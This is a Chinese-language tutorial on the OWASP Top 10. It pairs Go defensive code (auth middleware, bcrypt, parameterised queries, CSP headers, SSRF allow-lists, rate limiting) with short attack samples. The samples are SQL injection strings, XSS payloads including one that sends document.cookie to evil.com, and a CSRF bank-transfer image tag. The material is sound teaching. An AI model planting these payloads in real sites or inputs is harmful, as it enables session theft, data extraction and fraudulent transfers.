# OWASP Top 10 详解

---

## 一、OWASP 简介

OWASP（Open Web Application Security Project）是一个开源的 Web 应用安全组织，每 3-4 年发布一次 Top 10 安全风险清单。

### 1.1 2021 版 Top 10

| 排名 | 风险 | 说明 |
|------|------|------|
| A01 | 权限控制失效 | 未经授权访问数据/功能 |
| A02 | 加密机制失效 | 敏感数据明文传输/存储 |
| A03 | 注入 | SQL/NoSQL/OS/LDAP 注入 |
| A04 | 不安全设计 | 缺乏安全架构设计 |
| A05 | 安全配置错误 | 默认配置/未关闭调试/云存储开放 |
| A06 | 脆弱过时组件 | 使用有已知漏洞的依赖 |
| A07 | 身份认证失败 | 弱密码/会话管理不当 |
| A08 | 软件和数据完整性失败 | 不安全的 CI/CD / 反序列化 |
| A09 | 安全日志与监控失败 | 攻击未被检测/告警 |
| A10 | 服务器端请求伪造 (SSRF) | 服务端发起非预期请求 |

---

## 二、A01 权限控制失效

### 2.1 常见场景

- 越权访问他人数据（水平越权）
- 普通用户访问管理功能（垂直越权）
- API 未做权限校验
- 目录遍历

### 2.2 防御措施

```go
// 中间件鉴权
func AuthMiddleware(c *gin.Context) {
    token := c.GetHeader("Authorization")
    claims, err := ParseToken(token)
    if err != nil {
        c.AbortWithStatusJSON(401, gin.H{"error": "unauthorized"})
        return
    }
    c.Set("userID", claims.UserID)
    c.Set("role", claims.Role)
    c.Next()
}

// 权限检查
func RequireRole(role string) gin.HandlerFunc {
    return func(c *gin.Context) {
        userRole := c.GetString("role")
        if userRole != role {
            c.AbortWithStatusJSON(403, gin.H{"error": "forbidden"})
            return
        }
        c.Next()
    }
}

// 资源所有权检查
func GetResource(c *gin.Context) {
    userID := c.GetString("userID")
    resourceID := c.Param("id")

    resource, err := service.GetResource(resourceID)
    if resource.OwnerID != userID {
        c.AbortWithStatusJSON(403, gin.H{"error": "forbidden"})
        return
    }
}
```

---

## 三、A02 加密机制失效

### 3.1 常见场景

- HTTP 明文传输
- 密码明文存储
- 使用弱加密算法（MD5/SHA1/DES）
- 密钥硬编码

### 3.2 防御措施

```go
import "golang.org/x/crypto/bcrypt"

// 密码哈希
func HashPassword(password string) (string, error) {
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    return string(bytes), err
}

// 密码验证
func CheckPassword(password, hash string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
    return err == nil
}

// 敏感数据加密存储
import "crypto/aes"
import "crypto/cipher"

func Encrypt(key []byte, plaintext []byte) ([]byte, error) {
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    return gcm.Seal(nonce, nonce, plaintext, nil), nil
}
```

---

## 四、A03 注入

### 4.1 SQL 注入

```sql
-- 攻击示例
SELECT * FROM users WHERE name = '' OR '1'='1' -- ' AND password = ''

-- 联合查询注入
SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admins --

-- 盲注
SELECT * FROM users WHERE id = 1 AND (SELECT LENGTH(password) FROM admins) > 10
```

```go
// ❌ 拼接 SQL
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)

// ✅ 参数化查询
db.Query("SELECT * FROM users WHERE name = ?", name)

// ✅ ORM
db.Where("name = ?", name).First(&user)
```

### 4.2 XSS (跨站脚本)

```html
<!-- 反射型 XSS -->
<script>alert(document.cookie)</script>

<!-- 存储型 XSS -->
<img src=x onerror="fetch('http://evil.com?c='+document.cookie)">

<!-- DOM 型 XSS -->
<div id="output"></div>
<script>
document.getElementById('output').innerHTML = location.hash.slice(1);
</script>
```

防御：
```go
// 输出编码
import "html"

func SafeOutput(s string) string {
    return html.EscapeString(s)
}

// CSP 头
c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'")

// HttpOnly Cookie
c.SetCookie("token", token, 3600, "/", "", true, true)
//                                                    ↑ HttpOnly
```

### 4.3 CSRF (跨站请求伪造)

```html
<!-- 攻击：用户已登录银行网站，访问恶意页面 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

防御：
```go
// CSRF Token
func CSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

// SameSite Cookie
c.SetSameSite(http.SameSiteStrictMode)

// 检查 Referer
if c.Request.Referer() != "" && !strings.HasPrefix(c.Request.Referer(), "https://mysite.com") {
    c.AbortWithStatus(403)
}
```

### 4.4 SSRF (服务器端请求伪造)

```go
// ❌ 直接使用用户输入的 URL
resp, err := http.Get(userProvidedURL)

// ✅ URL 白名单 + 禁止内网
func safeFetch(urlStr string) (*http.Response, error) {
    u, err := url.Parse(urlStr)
    if err != nil {
        return nil, err
    }

    // 禁止内网地址
    ip := net.ParseIP(u.Hostname())
    if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
        return nil, fmt.Errorf("internal address not allowed")
    }

    // 白名单域名
    allowed := []string{"api.example.com", "cdn.example.com"}
    if !contains(allowed, u.Hostname()) {
        return nil, fmt.Errorf("domain not allowed")
    }

    return http.Get(urlStr)
}
```

---

## 五、A05 安全配置错误

### 5.1 常见问题

- 使用默认用户名/密码
- 未关闭调试模式
- 目录列表开启
- 云存储 ACL 过宽
- 不必要的 HTTP 方法（PUT/DELETE/OPTIONS）

### 5.2 防御清单

```go
// 安全响应头
func SecurityHeaders(c *gin.Context) {
    c.Header("X-Content-Type-Options", "nosniff")
    c.Header("X-Frame-Options", "DENY")
    c.Header("X-XSS-Protection", "1; mode=block")
    c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
    c.Header("Content-Security-Policy", "default-src 'self'")
    c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
    c.Next()
}

// 错误处理（不暴露内部信息）
func ErrorHandler(c *gin.Context) {
    defer func() {
        if r := recover(); r != nil {
            log.Printf("panic: %v\n%s", r, debug.Stack())
            c.JSON(500, gin.H{"error": "internal server error"})
        }
    }()
    c.Next()
}
```

---

## 六、A07 身份认证失败

### 6.1 常见问题

- 允许弱密码
- 暴力破解无限制
- 会话 ID 可预测
- 会话不过期

### 6.2 防御措施

```go
// 密码强度检查
func ValidatePassword(password string) error {
    if len(password) < 8 {
        return fmt.Errorf("password too short")
    }
    if !regexp.MustCompile(`[A-Z]`).MatchString(password) {
        return fmt.Errorf("need uppercase")
    }
    if !regexp.MustCompile(`[a-z]`).MatchString(password) {
        return fmt.Errorf("need lowercase")
    }
    if !regexp.MustCompile(`[0-9]`).MatchString(password) {
        return fmt.Errorf("need digit")
    }
    return nil
}

// 登录限流
var loginLimiter = rate.NewLimiter(rate.Every(time.Minute), 5)

func Login(c *gin.Context) {
    if !loginLimiter.Allow() {
        c.JSON(429, gin.H{"error": "too many attempts"})
        return
    }
    // ...
}

// 会话管理
func CreateSession(userID string) (string, error) {
    claims := jwt.MapClaims{
        "sub": userID,
        "exp": time.Now().Add(24 * time.Hour).Unix(),
        "iat": time.Now().Unix(),
        "jti": uuid.New().String(), // 唯一 ID，支持吊销
    }
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(secretKey)
}
```

---

## 七、A09 安全日志与监控失败

### 7.1 应记录的事件

| 事件 | 级别 |
|------|------|
| 登录成功/失败 | INFO/WARN |
| 权限变更 | WARN |
| 输入验证失败 | WARN |
| 异常堆栈 | ERROR |
| 敏感数据访问 | INFO |

### 7.2 日志规范

```go
// ✅ 记录安全事件
log.Info("login success",
    "user_id", userID,
    "ip", clientIP,
    "user_agent", userAgent,
)

log.Warn("login failed",
    "username", username,
    "ip", clientIP,
    "reason", "invalid password",
)

// ❌ 不要记录敏感信息
log.Info("user data", "password", password) // 绝对禁止
log.Info("credit card", "cvv", cvv)         // 绝对禁止
```

---

## 八、安全检查清单

| 类别 | 检查项 |
|------|--------|
| 认证 | 强密码策略、多因素认证、登录限流 |
| 授权 | RBAC、资源所有权校验、最小权限 |
| 输入 | 参数化查询、输入校验、输出编码 |
| 加密 | HTTPS、密码哈希、敏感数据加密 |
| 配置 | 安全头、关闭调试、删除默认账户 |
| 日志 | 安全事件记录、不记录敏感信息、告警 |
| 依赖 | 定期更新、漏洞扫描（Trivy/Snyk） |
| API | 限流、认证、输入校验、CORS 配置 |
